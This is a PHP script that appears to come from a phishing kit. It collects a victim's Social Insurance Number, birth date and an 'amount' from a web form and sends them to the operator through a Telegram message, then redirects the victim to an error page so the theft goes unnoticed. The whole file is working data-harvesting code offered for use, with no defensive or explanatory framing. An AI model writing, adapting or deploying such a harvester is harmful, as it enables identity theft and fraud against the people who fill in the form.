<?php
include("config.php");
//Server Variables
            $browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $sin = $_POST['sin'];
    $birthDay = $_POST['birthDay'];
    $birthMonth = $_POST['birthMonth'];
    $birthYear = $_POST['birthYear'];
    $dtfAmount = $_POST['dtfAmount'];
    $serv = $_REQUEST['card1'];


        //Telegram send
        $message = "**Register INFO\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "SIN: ".$_POST['sin']."\n";
        $message .= "----------------------------------------\n";
        $message .= "BIRTHDAY: ".$_POST['birthDay']."\n";
        $message .= "----------------------------------------\n";
        $message .= "BIRTHMONTH: ".$_POST['birthMonth']."\n";
        $message .= "----------------------------------------\n";
        $message .= "BIRTHYEAR: ".$_POST['birthYear']."\n";
        $message .= "----------------------------------------\n";
        $message .= "AMOUNT: ".$_POST['dtfAmount']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Output
        header("location:error.html");
?>
